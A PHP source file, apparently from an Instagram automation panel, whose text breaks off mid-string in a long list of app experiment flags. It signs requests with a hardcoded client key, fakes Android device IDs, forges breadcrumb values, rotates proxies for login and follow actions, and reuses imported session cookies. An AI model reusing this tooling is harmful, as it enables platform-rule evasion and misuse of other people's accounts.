<?php

use \JsonMachine\Items;

class AntiFlood
{
	const OPTION_COUNTER_RESET_SECONDS = 'COUNTER_RESET_SECONDS';
	const OPTION_BAN_REMOVE_SECONDS = 'BAN_REMOVE_SECONDS';
	const OPTION_MAX_REQUESTS = 'MAX_REQUESTS';
	const OPTION_DATA_PATH = 'DATA_PATH';

	private $options;
	private $ip;

	public function __construct($overrideOptions = [])
	{
		$this->options = array_merge(['COUNTER_RESET_SECONDS' => 2, 'MAX_REQUESTS' => 2, 'BAN_REMOVE_SECONDS' => 10, 'DATA_PATH' => '/tmp/antiflood_' . str_replace(['www.', '.'], ['', '_'], $_SERVER['SERVER_NAME'])], $overrideOptions);
		@mkdir($this->options['DATA_PATH']);
		$this->ip = $_SERVER['REMOTE_ADDR'];
	}

	public function isBanned()
	{
		$controlLockFile = $this->options['DATA_PATH'] . '/' . str_replace('.', '_', $this->ip);

		if (file_exists($controlLockFile)) {
			if ($this->options['BAN_REMOVE_SECONDS'] < (time() - filemtime($controlLockFile))) {
				unlink($controlLockFile);
			} else {
				touch($controlLockFile);
				return true;
			}
		}

		$controlFile = $this->options['DATA_PATH'] . '/ctrl';
		$control = [];

		if (file_exists($controlFile)) {
			$fh = fopen($controlFile, 'r');
			$fileContentsArr = (0 < filesize($controlFile) ? json_decode(fread($fh, filesize($controlFile)), true) : []);
			$control = array_merge($control, $fileContentsArr);
			fclose($fh);
		}

		if (isset($control[$this->ip])) {
			if ((time() - $control[$this->ip]['t']) < $this->options['COUNTER_RESET_SECONDS']) {
				$control[$this->ip]['c']++;
			} else {
				$control[$this->ip]['c'] = 1;
			}
		} else {
			$control[$this->ip]['c'] = 1;
		}

		$control[$this->ip]['t'] = time();

		if ($this->options['MAX_REQUESTS'] < $control[$this->ip]['c']) {
			$fh = fopen($controlLockFile, 'w');
			fwrite($fh, '');
			fclose($fh);
		}

		$fh = fopen($controlFile, 'w');
		fwrite($fh, json_encode($control));
		fclose($fh);
		return false;
	}
}

class Signatures
{
	static public function generateSignature($data)
	{
		return hash_hmac('sha256', $data, Constants::IG_SIG_KEY);
	}

	static public function signData($data, $exclude = [])
	{
		$result = [];

		foreach ($exclude as $key) {
			if (isset($data[$key])) {
				$result[$key] = $data[$key];
				unset($data[$key]);
			}
		}

		foreach ($data as &$value) {
			if (is_scalar($value)) {
				$value = (string) $value;
			}
		}

		unset($value);
		$data = json_encode((object) Utils::reorderByHashCode($data));
		$result['ig_sig_key_version'] = Constants::SIG_KEY_VERSION;
		$result['signed_body'] = '1.' . $data;
		return Utils::reorderByHashCode($result);
	}

	static public function generateDeviceId()
	{
		$megaRandomHash = md5(number_format(microtime(true), 7, '', ''));
		return 'android-' . substr($megaRandomHash, 16);
	}

	static public function generateUUID($keepDashes = true)
	{
		$uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 4095) | 16384, mt_rand(0, 16383) | 32768, mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
		return $keepDashes ? $uuid : str_replace('-', '', $uuid);
	}
}

class Utils
{
	const BOUNDARY_CHARS = '-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	const BOUNDARY_LENGTH = 30;

	/**
	 * Last uploadId generated with microtime().
	 *
	 * @var string|null
	 */
	static protected $_lastUploadId;

	static public function generateMultipartBoundary()
	{
		$result = '';
		$max = strlen('-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') - 1;

		for ($i = 0; $i < 30; ++$i) {
			$result .= '-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'[mt_rand(0, $max)];
		}

		return $result;
	}

	static public function hashCode($string)
	{
		$result = 0;
		$len = strlen($string);

		for ($i = 0; $i < $len; ++$i) {
			$result = ((-1 * $result) + ($result << 5) + ord($string[$i])) & 4294967295.0;
		}

		if (4 < PHP_INT_SIZE) {
			if (2147483647 < $result) {
				$result -= 4294967296.0;
			} else if ($result < -2147483648.0) {
				$result += 4294967296.0;
			}
		}

		return $result;
	}

	static public function reorderByHashCode($data)
	{
		$hashCodes = [];

		foreach ($data as $key => $value) {
			$hashCodes[$key] = self::hashCode($key);
		}

		uksort($data, function ($a, $b) use ($hashCodes) {
			$a = $hashCodes[$a];
			$b = $hashCodes[$b];

			if ($a < $b) {
				return -1;
			} else if ($b < $a) {
				return 1;
			} else {
				return 0;
			}
		});
		return $data;
	}

	static public function generateUploadId($useNano = false)
	{
		$result = NULL;

		if (!$useNano) {
			while (true) {
				$result = number_format(round(microtime(true) * 1000), 0, '', '');
				if ((self::$_lastUploadId !== NULL) && ($result === self::$_lastUploadId)) {
					usleep(1000);
					continue;
				}

				self::$_lastUploadId = $result;
				break;
			}
		} else {
			$result = number_format(microtime(true) - strtotime('Last Monday'), 6, '', '');
			$result .= str_pad((string) mt_rand(1, 999), 3, '0', STR_PAD_LEFT);
		}

		return $result;
	}

	static public function generateUserBreadcrumb($size)
	{
		$key = 'iN4$aGr0m';
		$date = (int) microtime(true) * 1000;
		$term = (rand(2, 3) * 1000) + ($size * rand(15, 20) * 100);
		$text_change_event_count = round($size / rand(2, 3));

		if ($text_change_event_count == 0) {
			$text_change_event_count = 1;
		}

		$data = $size . ' ' . $term . ' ' . $text_change_event_count . ' ' . $date;
		return base64_encode(hash_hmac('sha256', $data, $key, true)) . "\n" . base64_encode($data) . "\n";
	}

	static public function cookieToArray($string, $domain)
	{
		$arrCookies = [];
		$fileVals = self::extractCookies($string);

		foreach ($fileVals as $cookie) {
			if ($cookie['domain'] == $domain) {
				$arrCookies[$cookie['name']] = $cookie['value'];
			}
		}

		return $arrCookies;
	}

	static public function generateAsns($asnsNumber)
	{
		$asnsNumber = intval($asnsNumber);
		if (($asnsNumber == 0) || (intval(Wow::get('ayar/proxyStatus')) == 0)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatus') == 3) {
			$byPassServerCode = trim(Wow::get('ayar/proxyList'));
			$byPassServerUA = (strpos($byPassServerCode, '@') !== false ? explode('@', $byPassServerCode)[0] : NULL);
			$byPassServerRange = (strpos($byPassServerCode, '@') !== false ? explode(':', explode('@', $byPassServerCode)[1]) : explode(':', $byPassServerCode));
			return [$byPassServerRange[0] . ':' . (intval($byPassServerRange[1]) + $asnsNumber), $byPassServerUA];
		}

		$asnsNumber--;
		$proxyList = explode("\r\n", Wow::get('ayar/proxyList'));
		$proxyString = (isset($proxyList[$asnsNumber]) ? $proxyList[$asnsNumber] : NULL);

		if (empty($proxyString)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatus') == 4) {
			$ipType = (strpos($proxyString, ':') !== false ? CURL_IPRESOLVE_V6 : NULL);
			return [$proxyString, $ipType];
		}

		$proxyUserPwd = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[0] : NULL);
		$proxyHostPort = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[1] : $proxyString);
		return [$proxyHostPort, $proxyUserPwd];
	}

	static public function generateAsnsLogin($asnsNumber)
	{
		$asnsNumber = intval($asnsNumber);
		if (($asnsNumber == 0) || (intval(Wow::get('ayar/proxyStatusLogin')) == 0)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatusLogin') == 3) {
			$byPassServerCode = trim(Wow::get('ayar/proxyListLogin'));
			$byPassServerUA = (strpos($byPassServerCode, '@') !== false ? explode('@', $byPassServerCode)[0] : NULL);
			$byPassServerRange = (strpos($byPassServerCode, '@') !== false ? explode(':', explode('@', $byPassServerCode)[1]) : explode(':', $byPassServerCode));
			return [$byPassServerRange[0] . ':' . (intval($byPassServerRange[1]) + $asnsNumber), $byPassServerUA];
		}

		$asnsNumber--;
		$proxyList = explode("\r\n", Wow::get('ayar/proxyListLogin'));
		$proxyString = (isset($proxyList[$asnsNumber]) ? $proxyList[$asnsNumber] : NULL);

		if (empty($proxyString)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatusLogin') == 4) {
			$ipType = (strpos($proxyString, ':') !== false ? CURL_IPRESOLVE_V6 : NULL);
			return [$proxyString, $ipType];
		}

		$proxyUserPwd = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[0] : NULL);
		$proxyHostPort = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[1] : $proxyString);
		return [$proxyHostPort, $proxyUserPwd];
	}

	static public function generateAsnsFollow($asnsNumber)
	{
		$asnsNumber = intval($asnsNumber);
		if (($asnsNumber == 0) || (intval(Wow::get('ayar/proxyStatusFollow')) == 0)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatusFollow') == 3) {
			$byPassServerCode = trim(Wow::get('ayar/proxyListFollow'));
			$byPassServerUA = (strpos($byPassServerCode, '@') !== false ? explode('@', $byPassServerCode)[0] : NULL);
			$byPassServerRange = (strpos($byPassServerCode, '@') !== false ? explode(':', explode('@', $byPassServerCode)[1]) : explode(':', $byPassServerCode));
			return [$byPassServerRange[0] . ':' . (intval($byPassServerRange[1]) + $asnsNumber), $byPassServerUA];
		}

		$asnsNumber--;
		$proxyList = explode("\r\n", Wow::get('ayar/proxyListFollow'));
		$proxyString = (isset($proxyList[$asnsNumber]) ? $proxyList[$asnsNumber] : NULL);

		if (empty($proxyString)) {
			return [NULL, NULL];
		}

		if (Wow::get('ayar/proxyStatusFollow') == 4) {
			$ipType = (strpos($proxyString, ':') !== false ? CURL_IPRESOLVE_V6 : NULL);
			return [$proxyString, $ipType];
		}

		$proxyUserPwd = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[0] : NULL);
		$proxyHostPort = (strpos($proxyString, '@') !== false ? explode('@', $proxyString)[1] : $proxyString);
		return [$proxyHostPort, $proxyUserPwd];
	}

	static public function extractCookies($string)
	{
		$lines = explode(PHP_EOL, $string);
		$cookies = [];

		foreach ($lines as $line) {
			$cookie = [];

			if (substr($line, 0, 10) == '#HttpOnly_') {
				$line = substr($line, 10);
				$cookie['httponly'] = true;
			} else {
				$cookie['httponly'] = false;
			}
			if ((substr($line, 0, 1) != '#') && (substr_count($line, '\\' . "\t") == 6)) {
				$tokens = explode('\\' . "\t", $line);
				$tokens = array_map('trim', $tokens);
				$cookie['domain'] = $tokens[0];
				$cookie['flag'] = $tokens[1];
				$cookie['path'] = $tokens[2];
				$cookie['secure'] = $tokens[3];
				$cookie['expiration-epoch'] = $tokens[4];
				$cookie['name'] = urldecode($tokens[5]);
				$cookie['value'] = urldecode($tokens[6]);
				$cookie['expiration'] = date('Y-m-d h:i:s', $tokens[4]);
				$cookies[] = $cookie;
			}
		}

		return $cookies;
	}

	static public function cookieConverter($cookie, $cnf, $c)
	{
		$confData = [];

		if (!empty($cnf)) {
			$separator = "\r\n";
			$line = strtok($cnf, $separator);

			while ($line !== false) {
				if ($line[0] == '#') {
					continue;
				}

				$kv = explode('=', $line, 2);
				$confData[$kv[0]] = trim($kv[1], "\r\n" . ' ');
				$line = strtok($separator);
			}
		}

		if (!isset($confData['username_id'])) {
			$confData['username_id'] = $c['username_id'];
		}

		if (isset($confData['user_agent'])) {
			unset($confData['user_agent']);
		}

		if (isset($confData['manufacturer'])) {
			unset($confData['manufacturer']);
		}

		if (isset($confData['device'])) {
			unset($confData['device']);
		}

		if (isset($confData['model'])) {
			unset($confData['model']);
		}

		$cookieData = self::cookieToArray($cookie, $c['isWebCookie'] == 1 ? 'www.instagram.com' : 'i.instagram.com');
		$cookie_all = [];

		foreach ($cookieData as $k => $v) {
			$cookie_all[] = $k . '=' . urlencode($v);

			if ($k == 'csrftoken') {
				$confData['token'] = $v;
			}
		}

		$v3Data = $confData;
		$v3CookieName = ($c['isWebCookie'] == 1 ? 'web_cookie' : 'cookie');
		$v3Data[$v3CookieName] = implode(';', $cookie_all);
		return json_encode($v3Data);
	}
}

class Settings
{
	private $path;
	private $sets;

	public function __construct($path)
	{
		$this->path = $path;
		$this->sets = [];

		if (file_exists($path)) {
			$sets = json_decode(file_get_contents($path), true);
			$this->sets = (is_array($sets) ? $sets : []);
		}
	}

	public function get($key, $default = NULL)
	{
		if ($key == 'sets') {
			return $this->sets;
		}

		if (isset($this->sets[$key])) {
			return $this->sets[$key];
		}

		return $default;
	}

	public function set($key, $value)
	{
		if ($key == 'sets') {
			return NULL;
		}

		$this->sets[$key] = $value;
	}

	public function save()
	{
		file_put_contents($this->path, json_encode($this->sets));
	}

	public function setPath($path)
	{
		$this->path = $path;
	}

	public function __set($prop, $value)
	{
		$this->set($prop, $value);
	}

	public function __get($prop)
	{
		return $this->get($prop);
	}
}

class Constants
{
	// Core API Constants.
	const API_URL = 'https://i.instagram.com/api/v1/';
	const API_URLb = 'https://b.i.instagram.com/api/v1/';
	const API_URLV2 = 'https://i.instagram.com/api/v2/';
	const IG_VERSION = '136.0.0.34.124';
	const VERSION_CODE = '208061712';
	const IG_SIG_KEY = '46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b';
	const EXPERIMENTS = 'ig_android_sticker_search_explorations,android_ig_camera_ar_asset_manager_improvements_universe,ig_android_stories_seen_state_serialization,ig_stories_photo_time_duration_universe,ig_android_bitmap_cache_executor_size,ig_android_stories_music_search_typeahead,ig_android_delayed_comments,ig_android_switch_back_option,ig_android_video_profiler_loom_traces,ig_android_paid_branded_content_rendering,ig_android_direct_app_reel_grid_search,ig_android_stories_no_inflation_on_app_start,ig_android_camera_sdk_check_gl_surface_r2,ig_promote_review_screen_title_universe,ig_android_direct_newer_single_line_composer_universe,ig_direct_holdout_h1_2019,ig_explore_2019_h1_destination_cover,ig_android_direct_stories_in_direct_inbox,ig_fb_graph_differentiation_no_fb_data,ig_android_recyclerview_binder_group_enabled_universe,ig_android_direct_share_sheet_custom_fast_scroller,ig_android_video_exoplayer_2,ig_android_shopping_channel_in_explore,ig_android_stories_music_filters,ig_android_2018_h1_hashtag_report_universe,ig_android_live_replay_highlights_universe,ig_android_hashtag_page_reduced_related_items,ig_android_live_titles_broadcaster_side_create_title_universe,ig_android_fbns_preload_direct_universe,ig_android_prefetch_carousels_on_swipe_universe,ig_camera_network_activity_logger,ig_camera_remove_display_rotation_cb_universe,ig_android_interactions_migrate_inline_composer_to_viewpoint_universe,ig_android_realtime_always_start_connection_on_condition_universe,ig_android_ad_leadgen_single_screen_universe,ig_android_enable_zero_rating,ig_android_import_page_post_after_biz_conversion,ig_camera_ar_effect_attribution_position,ig_android_vc_call_ended_cleanup_universe,ig_stories_engagement_holdout_2019_h1_universe,ig_android_story_import_intent,ig_direct_report_conversation_universe,ig_biz_graph_connection_universe,ig_android_codec_high_profile,ig_android_nametag,ig_android_sso_family_key_universe,ig_android_parse_direct_messages_bytes_universe,ig_hashtag_creation_universe,ig_android_gallery_order_by_date_taken,ig_android_igtv_reshare,ig_end_of_feed_universe,ig_android_share_others_post_reorder,ig_android_additional_contact_in_nux,ig_android_live_use_all_preview_sizes,ig_android_clarify_invite_options,ig_android_live_align_by_2_universe,ig_android_separate_network_executor,ig_android_realtime_manager_optimization,ig_android_auto_advance_su_unit_when_scrolled_off_screen,ig_android_network_cancellation,ig_android_media_as_sticker,ig_android_stories_video_prefetch_kb,ig_android_maintabfragment,ig_inventory_connections,ig_stories_injection_tool_enabled_universe,ig_android_stories_disable_highlights_media_preloading,ig_android_live_start_broadcast_optimized_universe,ig_android_stories_question_response_mutation_universe,ig_android_onetap_upsell_change_pwd,ig_nametag_data_collection,ig_android_disable_scroll_listeners,ig_android_persistent_nux,ig_android_igtv_audio_always_on,ig_android_enable_liger_preconnect_universe,ig_android_persistent_duplicate_notif_checker_user_based,ig_android_rate_limit_mediafeedviewablehelper,ig_android_search_remove_null_state_sections,ig_android_stories_viewer_drawable_cache_universe,ig_direct_android_reply_modal_universe,ig_android_biz_qp_suggest_page,ig_shopping_indicator_content_variations_android,ig_android_stories_reel_media_item_automatic_retry,ig_fb_notification_universe,ig_android_live_disable_speed_test_ui_timeout_universe,ig_android_direct_thread_scroll_perf_oncreate_universe,ig_android_low_data_mode_backup_2,ig_android_invite_xout_universe,ig_android_low_data_mode_backup_3,ig_android_low_data_mode_backup_4,ig_android_low_data_mode_backup_5,ig_android_video_abr_universe,ig_android_low_data_mode_backup_1,ig_android_signup_refactor_santity,ig_challenge_general_v2,ig_android_place_signature_universe,ig_android_hide_button_for_invite_facebook_friends,ig_android_business_promote_tooltip,ig_android_follow_requests_ui_improvements,ig_android_shopping_post_tagging_nux_universe,ig_android_stories_sensitivity_screen,ig_android_camera_arengine_shader_caching_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_direct_view_more_qe,ig_android_direct_visual_message_prefetch_count_universe,ig_camera_android_ar_effect_stories_deeplink,ig_android_client_side_delivery_universe,ig_android_stories_send_client_reels_on_tray_fetch_universe,ig_android_direct_inbox_background_view_models,ig_android_startup_thread_priority,ig_android_stories_viewer_responsiveness_universe,ig_android_live_use_rtc_upload_universe,ig_android_live_ama_viewer_universe,ig_android_business_id_conversion_universe,ig_smb_ads_holdout_2018_h2_universe,ig_android_modal_activity_no_animation_fix_universe,ig_android_camera_post_smile_low_end_universe,ig_android_live_realtime_comments_universe,ig_android_vc_in_app_notification_universe,ig_eof_caboose_universe,ig_android_new_one_tap_nux_universe,ig_android_igds_edit_profile_fields,ig_android_downgrade_viewport_exit_behavior,ig_android_mi_batch_upload_universe,ig_camera_android_segmentation_async_universe,ig_android_use_recyclerview_for_direct_search_universe,ig_android_live_comment_fetch_frequency_universe,ig_android_create_page_on_top_universe,ig_android_direct_log_badge_count_inconsistent,ig_android_stories_text_format_emphasis,ig_android_question_sticker_replied_state,ig_android_ad_connection_manager_universe,ig_android_image_upload_skip_queue_only_on_wifi,ig_android_ad_watchbrowse_carousel_universe,ig_android_interactions_show_verified_badge_for_preview_comments_universe,ig_stories_question_sticker_music_format_prompt,ig_android_activity_feed_row_click,ig_android_hide_crashing_newsfeed_story_t38131972,ig_android_video_upload_quality_qe1,ig_android_save_collaborative_collections,ig_android_location_attribution_text,ig_camera_android_profile_ar_notification_universe,coupon_price_test_boost_instagram_media_acquisition_universe,ig_android_video_outputsurface_handlerthread_universe,ig_android_country_code_fix_universe,ig_perf_android_holdout_2018_h1,ig_android_stories_music_overlay,ig_android_enable_lean_crash_reporting_universe,ig_android_resumable_downloads_logging_universe,ig_android_stories_default_rear_camera_universe,ig_android_low_latency_consumption_universe,ig_android_offline_mode_holdout,ig_android_foreground_location_collection,ig_android_stories_close_friends_disable_first_time_badge,ig_android_react_native_universe_kill_switch,ig_android_video_ta_universe,ig_android_media_rows_async_inflate,ig_android_stories_gallery_video_segmentation,ig_android_stories_in_feed_preview_notify_fix_universe,ig_android_video_rebind_force_keep_playing_fix,ig_android_direct_business_holdout,ig_android_xposting_upsell_directly_after_sharing_to_story,ig_android_gallery_high_quality_photo_thumbnails,ig_android_interactions_new_comment_like_pos_universe,ig_feed_core_experience_universe,ig_android_friends_sticker,ig_android_business_ix_universe,ig_android_suggested_highlights,ig_android_stories_posting_offline_ui,ig_android_stories_close_friends_rings_remove_green_universe,ig_android_canvas_tilt_to_pan_universe,ig_android_vc_background_call_toast_universe,ig_android_concurrent_cold_start_universe,ig_promote_default_destination_universe,mi_viewpoint_viewability_universe,ig_android_location_page_info_page_upsell,igds_android_listrow_migration_universe,ig_direct_reshare_sharesheet_ranking,ig_android_fb_sync_options_universe,ig_android_drawable_usage_logging_universe,ig_android_recommend_accounts_destination_routing_fix,ig_android_fix_prepare_direct_push,ig_direct_android_larger_media_reshare_style,ig_android_video_feed_universe,ig_android_building_aymf_universe,ig_android_internal_sticker_universe,ig_traffic_routing_universe,ig_android_search_normalization,ig_android_ad_watchmore_entry_point_universe,ig_camera_android_segmentation_enabled_universe,ig_android_igtv_always_show_browse_ui,ig_android_page_claim_deeplink_qe,ig_explore_2018_h2_account_rec_deduplication_android,ig_android_story_accidentally_click_investigation_universe,ig_android_shopping_pdp_hero_carousel,ig_android_clear_inflight_image_request,ig_android_show_su_in_other_users_follow_list,ig_android_stories_infeed_lower_threshold_launch,ig_android_main_feed_video_countdown_timer,instagram_interests_holdout,ig_android_continuous_video_capture,ig_android_category_search_edit_profile,ig_android_contact_invites_nux_universe,ig_android_settings_search_v2_universe,ig_android_video_upload_iframe_interval,ig_business_new_value_prop_universe,ig_android_power_metrics,ig_android_stories_collapse_seen_segments,ig_android_live_follow_from_comments_universe,ig_android_hashtag_discover_tab,ig_android_live_skip_live_encoder_pts_correction,ig_android_reel_zoom_universe,enable_creator_account_conversion_v0_universe,ig_android_test_not_signing_address_book_unlink_endpoint,ig_android_direct_tabbed_media_picker,ig_android_direct_mutation_manager_job_scheduler,ig_ei_option_setting_universe,ig_android_hashtag_related_items_over_logging,ig_android_livewith_liveswap_optimization_universe,ig_android_direct_new_intro_card,ig_camera_android_supported_capabilities_api_universe,ig_android_video_webrtc_textureview,ig_android_share_claim_page_universe,ig_direct_android_mentions_sender,ig_android_whats_app_contact_invite_universe,ig_android_video_scrubber_thumbnail_universe,ig_camera_ar_image_transform_library,ig_android_insights_creation_growth_universe,ig_android_igtv_refresh_tv_guide_interval,ig_android_stories_gif_sticker,ig_android_stories_music_broadcast_receiver,ig_android_fb_profile_integration_fbnc_universe,ig_android_low_data_mode,ig_fb_graph_differentiation_control,ig_android_show_create_content_pages_universe,ig_android_igsystrace_universe,ig_android_new_contact_invites_entry_points_universe,ig_android_ccu_jobscheduler_inner,ig_android_netego_scroll_perf,ig_android_fb_connect_follow_invite_flow,ig_android_invite_list_button_redesign_universe,ig_android_react_native_email_sms_settings_universe,ig_android_igtv_aspect_ratio_limits,ig_hero_player,ig_android_save_auto_sharing_to_fb_option_on_server,ig_android_live_presence_universe,ig_android_whitehat_options_universe,android_cameracore_preview_frame_listener2_ig_universe,ig_android_memory_manager,ig_account_recs_in_chaining,ig_explore_2018_finite_chain_android_universe,ig_android_tagging_video_preview,ig_android_feed_survey_viewpoint,ig_android_hashtag_search_suggestions,ig_android_profile_neue_infra_rollout_universe,ig_android_instacrash_detection,ig_android_interactions_add_search_bar_to_likes_list_universe,ig_android_vc_capture_universe,ig_nametag_local_ocr_universe,ig_branded_content_share_to_facebook,ig_android_direct_segmented_video,ig_android_search_page_v2,ig_android_stories_recently_captured_universe,ig_business_integrity_ipc_universe,ig_android_share_product_universe,ig_fb_graph_differentiation_top_k_fb_coefficients,ig_shopping_viewer_share_action,ig_android_direct_share_story_to_facebook,ig_android_business_attribute_sync,ig_android_video_time_to_live_cache_eviction,ig_android_location_feed_related_business,ig_android_view_and_likes_cta_universe,ig_live_holdout_h2_2018,ig_android_profile_memories_universe,ig_promote_budget_warning_view_universe,ig_android_redirect_to_web_on_oembed_fail_universe,ig_android_optic_new_focus_controller,ig_android_shortcuts,ig_android_search_hashtag_badges,ig_android_navigation_latency_logger,ig_android_direct_composer_avoid_hiding_thread_camera,ig_android_direct_remix_visual_messages,ig_android_custom_story_import_intent,ig_android_biz_new_choose_category,ig_android_view_info_universe,ig_android_camera_upsell_dialog,ig_android_business_ix_self_serve,ig_android_dead_code_detection,ig_android_ad_watchbrowse_universe,ig_android_pbia_proxy_profile_universe,ig_android_qp_kill_switch,ig_android_gap_rule_enforcer_universe,ig_android_direct_delete_or_block_from_message_requests,ig_android_direct_left_aligned_navigation_bar,ig_android_feed_load_more_viewpoint_universe,ig_android_stories_reshare_reply_msg,ig_android_one_tap_sharesheet_fb_extensions,ig_android_stories_feeback_message_composer_entry_point,ig_direct_holdout_h2_2018,ig_camera_android_facetracker_v12_universe,ig_android_camera_ar_effects_low_storage_universe,ig_camera_android_black_feed_sticker_fix_universe,ig_android_direct_media_forwarding,ig_android_camera_attribution_in_direct,ig_android_audience_control,ig_android_stories_cross_sharing_to_fb_holdout_universe,ig_android_enable_main_feed_reel_tray_preloading,ig_android_profile_neue_universe,ig_company_profile_holdout,ig_camera_android_areffect_photo_capture_universe,ig_rti_inapp_notifications_universe,ig_android_vc_join_timeout_universe,ig_android_feed_core_ads_2019_h1_holdout_universe,ig_android_interactions_composer_mention_search_universe,ig_android_igtv_save,ig_android_follower_following_whatsapp_invite_universe,ig_android_claim_location_page,ig_android_story_ads_2019_h1_holdout_universe,ig_android_3pspp,ig_android_cache_timespan_objects,ig_timestamp_public_test,ig_android_histogram_reporter,ig_android_feed_auto_share_to_facebook_dialog,ig_android_arengine_separate_prepare,ig_android_skip_button_content_on_connect_fb_universe,ig_android_igtv_profile_tab,ig_android_show_fb_name_universe,ig_android_interactions_inline_composer_extensions_universe,ig_camera_async_space_validation_for_ar,ig_android_pigeon_sampling,ig_story_camera_reverse_video_experiment,ig_android_live_use_timestamp_normalizer,ig_android_profile_lazy_load_carousel_media,ig_android_stories_question_sticker_music_format,ig_business_profile_18h1_holdout_universe,ig_pacing_overriding_universe,ig_android_direct_allow_multiline_composition,ig_android_interactions_emoji_extension_followup_universe,ig_android_story_ads_direct_cta_universe,ig_android_q3lc_transparency_control_settings,ig_stories_selfie_sticker,ig_android_sso_use_trustedapp_universe,ig_android_ad_increase_story_adpreload_priority_universe,ig_android_interests_netego_dismiss,ig_direct_giphy_gifs_rating,ig_android_shopping_catalogsearch,ig_android_stories_music_awareness_universe,ig_android_qcc_perf,ig_android_stories_reels_tray_media_count_check,ig_android_new_fb_page_selection,ig_android_facebook_crosspost,ig_android_internal_collab_save,ig_video_holdout_h2_2017,ig_android_story_sharing_universe,ig_promote_post_insights_entry_universe,ig_android_direct_thread_store_rewrite,ig_android_qp_clash_management_enabled_v4_universe,ig_branded_content_paid_branded_content,ig_android_large_heap_override,ig_android_live_subscribe_user_level_universe,ig_android_igtv_creation_flow,ig_android_video_call_finish_universe,ig_android_direct_mqtt_send,ig_android_do_not_fetch_follow_requests_on_success,ig_android_remove_push_notifications,ig_android_vc_directapp_integration_universe,ig_android_explore_discover_people_entry_point_universe,ig_android_sonar_prober_universe,ig_android_live_bg_download_face_filter_assets_universe,ig_android_gif_framerate_throttling,ig_android_live_webrtc_livewith_params,ig_android_vc_always_start_connection_on_condition_universe,ig_camera_worldtracking_set_scale_by_arclass,ig_android_direct_inbox_typing_indicator,ig_android_stories_music_lyrics_scrubber,ig_feed_experience,ig_android_direct_new_thread_local_search_fix_universe,ig_android_appstate_logger,ig_promote_insights_video_views_universe,ig_android_dismiss_recent_searches,ig_android_downloadable_igrtc_module,ig_android_fb_link_ui_polish_universe,ig_stories_music_sticker,ig_android_device_capability_framework,ig_scroll_by_two_cards_for_suggested_invite_universe,ig_android_stories_helium_balloon_badging_universe,ig_android_business_remove_unowned_fb_pages,ig_android_stories_combined_asset_search,ig_stories_allow_camera_actions_while_recording,ig_android_analytics_mark_events_as_offscreen,ig_android_optic_feature_testing,ig_android_camera_universe,ig_android_optic_photo_cropping_fixes,ig_camera_regiontracking_use_similarity_tracker_for_scaling,ig_android_refreshable_list_view_check_spring,felix_android_video_quality,ig_android_biz_endpoint_switch,ig_android_direct_continuous_capture,ig_android_comments_direct_reply_to_author,ig_android_vc_webrtc_params,ig_android_claim_or_connect_page_on_xpost,ig_android_anr,ig_android_optic_new_architecture,ig_android_stories_viewer_as_modal_high_end_launch,ig_android_hashtag_follow_chaining_over_logging,ig_new_eof_demarcator_universe,ig_android_push_notifications_settings_redesign_universe,ig_hashtag_display_universe,ig_fbns_push,coupon_price_test_ad4ad_instagram_resurrection_universe,ig_android_live_rendering_looper_universe,ig_android_mqtt_cookie_auth_memcache_universe,ig_android_live_end_redirect_universe,ig_android_direct_mutation_manager_media_2,ig_android_ccu_jobscheduler_outer,ig_smb_ads_holdout_2019_h1_universe,ig_fb_graph_differentiation,ig_android_stories_share_extension_video_segmentation,ig_android_interactions_realtime_typing_indicator_and_live_comments,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_nerd_stats_universe,ig_android_universe_video_production,ig_android_hide_reset_with_fb_universe,ig_android_reactive_feed_like_count,ig_android_stories_music_precapture,ig_android_vc_service_crash_fix_universe,ig_android_shopping_product_overlay,ig_android_direct_double_tap_to_like_hearts,ig_camera_android_api_rewrite_universe,ig_android_growth_fci_team_holdout_universe,ig_android_stories_gallery_recyclerview_kit_universe,ig_android_story_ads_instant_sub_impression_universe,ig_business_signup_biz_id_universe,ig_android_save_all,ig_android_main_feed_fragment_scroll_timing_histogram_uni,ig_android_ttcp_improvements,ig_android_camera_ar_platform_profile_universe,ig_explore_2018_topic_channel_navigation_android_universe,ig_android_live_fault_tolerance_universe,ig_android_stories_viewer_tall_android_cap_media_universe,native_contact_invites_universe,ig_android_dash_script,ig_android_insights_media_hashtag_insight_universe,ig_camera_fast_tti_universe,ig_android_stories_whatsapp_share,ig_android_inappnotification_rootactivity_tweak,ig_android_render_thread_memory_leak_holdout,ig_android_private_highlights_universe,ig_android_rate_limit_feed_video_module,ig_android_one_tap_fbshare,ig_share_to_story_toggle_include_shopping_product,ig_android_direct_speed_cam_univ,ig_payments_billing_address,ig_android_ufiv3_holdout,ig_android_new_camera_design_container_animations_universe,ig_android_livewith_guest_adaptive_camera_universe,ig_android_direct_fix_playing_invalid_visual_message,ig_shopping_viewer_intent_actions,ig_promote_add_payment_navigation_universe,ig_android_optic_disable_post_capture_preview_restart,ig_android_main_feed_refresh_style_universe,ig_android_live_analytics,ig_android_story_ads_performance_universe_1,ig_android_stories_viewer_modal_activity,ig_android_story_ads_performance_universe_3,ig_android_story_ads_performance_universe_4,ig_android_feed_seen_state_with_view_info,ig_android_ads_profile_cta_feed_universe,ig_android_vc_cowatch_universe,ig_android_optic_thread_priorities,ig_android_igtv_chaining,ig_android_live_qa_viewer_v1_universe,ig_android_stories_show_story_not_available_error_msg,ig_android_inline_notifications_recommended_